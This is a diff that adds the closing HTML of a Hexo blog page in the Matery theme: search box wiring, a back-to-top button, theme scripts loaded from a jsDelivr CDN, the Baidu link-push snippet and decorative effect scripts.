+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script src="/js/search.js"></script>
+<script type="text/javascript">
+$(function () {
+    searchFunc("/search.xml", 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="https://cdn.jsdelivr.net/gh/itboy-chencf/itboy-chencf.github.io/libs/materialize/materialize.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/itboy-chencf/itboy-chencf.github.io/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/itboy-chencf/itboy-chencf.github.io/libs/aos/aos.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/itboy-chencf/itboy-chencf.github.io/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/itboy-chencf/itboy-chencf.github.io/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/itboy-chencf/itboy-chencf.github.io/js/matery.js"></script>
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="https://cdn.jsdelivr.net/gh/itboy-chencf/itboy-chencf.github.io/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="https://cdn.jsdelivr.net/gh/itboy-chencf/itboy-chencf.github.io/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/gh/itboy-chencf/itboy-chencf.github.io/libs/background/ribbon-dynamic.js" async="async"></script>
+    
+
+    
+    <script src="https://cdn.jsdelivr.net/gh/itboy-chencf/itboy-chencf.github.io/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
